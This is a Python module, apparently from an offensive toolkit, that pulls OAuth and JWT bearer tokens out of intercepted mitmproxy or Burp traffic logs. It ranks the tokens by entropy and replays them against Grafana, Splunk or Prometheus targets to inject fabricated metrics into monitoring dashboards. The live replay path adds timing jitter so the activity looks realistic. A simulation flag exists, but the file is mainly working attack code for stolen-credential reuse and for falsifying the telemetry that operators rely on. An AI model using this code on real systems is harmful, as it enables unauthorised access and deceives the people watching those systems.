import os
import json
import time
import logging
import random
import re
from typing import Optional, List
from datetime import datetime
from core.operator_mind_poisoning import inject_fake_grafana_series

logger = logging.getLogger("OAuthTokenClone")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

# Patterns
BEARER_REGEX = re.compile(r"Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)")
GOOGLE_TOKEN_PATTERN = re.compile(r"Bearer\s+(ya29\.[\w\-]+)")

SUPPORTED_TARGETS = ["grafana", "splunk", "prometheus"]


def extract_bearer_tokens_from_log(log_path: str) -> List[str]:
    """
    Parse JSON logs (mitmproxy/Burp style) and extract unique bearer tokens.
    """
    if not os.path.exists(log_path):
        logger.warning(f"[TokenClone] File not found: {log_path}")
        return []

    try:
        with open(log_path, "r") as f:
            data = json.load(f)
    except Exception as e:
        logger.error(f"[TokenClone] Failed to parse log: {e}")
        return []

    tokens = []
    for entry in data:
        headers = entry.get("request", {}).get("headers", {})
        if isinstance(headers, dict):
            for key, val in headers.items():
                if isinstance(val, str) and "bearer" in val.lower():
                    match_jwt = BEARER_REGEX.search(val)
                    match_google = GOOGLE_TOKEN_PATTERN.search(val)
                    if match_jwt:
                        tokens.append(match_jwt.group(1))
                    elif match_google:
                        tokens.append(match_google.group(1))
                    else:
                        tokens.append(val.strip())

    return list(set(tokens))


def score_token_entropy(token: str) -> float:
    """
    Shannon entropy estimation.
    """
    import math
    from collections import Counter
    if not token:
        return 0.0

    counter = Counter(token)
    probs = [count / len(token) for count in counter.values()]
    entropy = -sum(p * math.log2(p) for p in probs)
    return round(entropy, 4)


def replay_token_into_target(
    token: str,
    target: str,
    target_url: str,
    simulation: bool = True,
    label: str = "phantom",
    headers: Optional[dict] = None,
    metrics: Optional[List[dict]] = None
):
    """
    Attempt token replay against Grafana/Splunk/Prometheus or simulate.
    """
    metrics = metrics or [
        {"metric": "phantom_login_attempts", "value": random.randint(40, 150), "label": label},
        {"metric": "entropy_score", "value": score_token_entropy(token), "label": label},
        {"metric": "rogue_actor_seen", "value": 1, "label": "APT-Shadow"}
    ]

    if simulation:
        logger.info(f"[SIM] Token replay simulation → {target_url} [{target}]")
        logger.debug(f"[SIM] Using token: {token[:10]}...")
        logger.debug(f"[SIM] Payload: {json.dumps(metrics, indent=2)}")
        return

    if target == "grafana":
        try:
            inject_fake_grafana_series(
                dashboard_url=target_url,
                token=token,
                metrics=metrics
            )
        except Exception as e:
            logger.error(f"[Grafana] Injection failed: {e}")

    elif target == "splunk":
        logger.warning("[Splunk] HEC injection not implemented.")
    elif target == "prometheus":
        logger.warning("[Prometheus] Pushgateway spoofing not implemented.")
    else:
        logger.error(f"[✗] Unsupported target: {target}")


def oauth_token_clone_attack(
    log_file: str,
    target_system: str,
    target_url: str,
    telemetry_log: Optional[str] = None,
    simulation: bool = True,
    max_replays: int = 3
):
    """
    Extract tokens from logs and replay them against telemetry dashboards or simulate.

    Args:
        log_file: JSON file from mitmproxy/Burp with headers.
        target_system: grafana, splunk, prometheus.
        target_url: URL of the target platform.
        telemetry_log: Optional path for logging replays.
        simulation: True = dry run.
        max_replays: Number of tokens to replay.
    """
    if target_system not in SUPPORTED_TARGETS:
        logger.error(f"[✗] Unsupported target: {target_system}")
        return

    tokens = extract_bearer_tokens_from_log(log_file)
    if not tokens:
        logger.warning("[TokenClone] No valid tokens extracted.")
        return

    logger.info(f"[✓] Found {len(tokens)} tokens. Starting replay...")

    sorted_tokens = sorted(tokens, key=score_token_entropy, reverse=True)
    for i, token in enumerate(sorted_tokens[:max_replays]):
        entropy = score_token_entropy(token)
        logger.info(f"[→] Token-{i+1} | Entropy={entropy:.3f}")

        replay_token_into_target(
            token=token,
            target=target_system,
            target_url=target_url,
            simulation=simulation,
            label=f"clone-{i}"
        )

        if telemetry_log:
            entry = {
                "timestamp": datetime.utcnow().isoformat(),
                "token_prefix": token[:12],
                "target": target_system,
                "url": target_url,
                "entropy": entropy,
                "replay_index": i,
                "simulation": simulation
            }
            os.makedirs(os.path.dirname(telemetry_log), exist_ok=True)
            with open(telemetry_log, "a") as f:
                f.write(json.dumps(entry) + "\n")

        time.sleep(random.uniform(1.2, 2.3))  # jitter for realism

    logger.info("[✓] OAuth token clone operation complete.")


# Export function to match engine expectations
oauth_token_clone = oauth_token_clone_attack
